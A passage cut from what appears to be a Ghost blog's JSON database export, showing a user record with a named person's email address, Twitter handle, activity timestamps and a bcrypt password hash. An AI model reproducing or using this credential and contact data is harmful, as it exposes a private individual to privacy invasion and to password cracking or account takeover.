created_at":"2018-05-05T02:50:46.000Z","created_by":"1","updated_at":"2018-05-05T02:54:53.000Z","updated_by":"1"}],"users":[{"id":"1","name":"AJ McQuay","slug":"amcquay","ghost_auth_access_token":null,"ghost_auth_id":null,"password":"$2a$10$ExiWHoVrefKAxY5XMSMsVemvcTS4DrPPS5Lh3cWE4O/KXuN61lXi.","email":"aj@ajmcquay.info","profile_image":null,"cover_image":null,"bio":null,"website":null,"location":null,"facebook":null,"twitter":"@aj_mcquay","accessibility":"{\"nightShift\":true}","status":"active","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"tour":"[\"upload-a-theme\",\"getting-started\",\"using-the-editor\",\"static-post\",\"featured-post\"]","last_seen":"2019-02-25T04:26:51.000Z","created_at":"2018-03-09T15:46:11.000Z","created_by":"1","updated_at":"2019-02-25T04:38:54.000Z","updated_by":"1"}],"webhooks":[]}}